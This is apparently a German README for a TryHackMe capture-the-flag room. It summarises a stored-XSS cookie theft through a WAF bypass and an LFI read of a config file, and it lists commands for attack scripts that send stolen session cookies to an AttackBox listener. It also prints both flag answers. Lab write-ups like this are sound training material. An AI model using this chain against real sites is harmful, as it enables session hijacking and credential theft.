# Padelify – TryHackMe CTF

> Padel Championship Web-App mit WAF-geschütztem Registrierungssystem.  
> Ziel: WAF-Bypass → Moderator-Zugang → Admin-Zugang → 2 Flags.

**Room:** [https://tryhackme.com/room/padelify](https://tryhackme.com/room/padelify)

---

## Übersicht

| Flag | Beschreibung | Technik |
|------|-------------|---------|
| Flag 1 | Moderator-Login | Stored XSS → Cookie-Theft via WAF-Bypass |
| Flag 2 | Admin-Login | Directory Traversal (LFI) → `app.conf` → Admin-Passwort |

## Zielumgebung

- **Ports:** 22 (SSH), 80 (HTTP/Apache 2.4.58)
- **WAF:** ModSecurity mit CRS (Custom Rules)
- **Backend:** PHP mit PHPSESSID (HttpOnly **nicht** gesetzt!)
- **Key-Info:** Moderator reviewed Registrierungen manuell

## Scripts

| Script | Zweck |
|--------|-------|
| `padelify_first.py` | Flag 1: Recon + XSS-Injection + Cookie-Listener + Moderator-Flag |
| `padelify_second.py` | Flag 2: LFI via WAF-Bypass → app.conf → Admin-Login |

## Quick Start – Flag 1

```bash
# 1. Nur Recon (Endpoints + error.log lesen)
python padelify_first.py --target <TARGET_IP> --recon-only

# 2. Voller Angriff: XSS-Payload injizieren + auf Cookie warten
python padelify_first.py --target <TARGET_IP> --attackbox <ATTACKBOX_IP> --port 8000

# 3. Cookie bereits vorhanden → direkt Flag abholen
python padelify_first.py --target <TARGET_IP> --cookie "PHPSESSID=<STOLEN_SESSION>"
```

**Flag 1 (Moderator):** `THM{Logged_1n_Moderat0r}`

## Quick Start – Flag 2

```bash
# Mit der Moderator-Session von Flag 1 → app.conf auslesen + Admin-Login
python padelify_second.py --target <TARGET_IP> --cookie "PHPSESSID=<MODERATOR_SESSION>"
```

**Flag 2 (Admin):** `THM{Logged_1n_Adm1n001}`
```

## Voraussetzungen

- TryHackMe VPN aktiv
- AttackBox erreichbar (für Cookie-Callback)
- Python 3.10+ (nur stdlib, keine externen Deps)
